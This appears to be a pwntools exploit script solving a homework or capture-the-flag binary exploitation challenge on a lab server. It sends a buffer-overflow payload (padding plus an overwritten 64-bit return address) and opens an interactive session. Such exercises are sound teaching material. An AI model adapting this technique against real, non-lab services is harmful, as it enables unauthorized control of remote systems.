#!/usr/bin/env python
# coding=utf-8

from pwn import *

r = remote('hw00.zoolab.org', 65534)

# EXPLOIT CODE GOES HERE

padding = b'A'
targer_address = p64(0x0000000000401177)
args = p64(0xCAFECAFECAFECAFE)
main = p64(0x0000000000401271)

r.sendline(args * 1 + padding * 16 + targer_address * 1)

r.interactive()
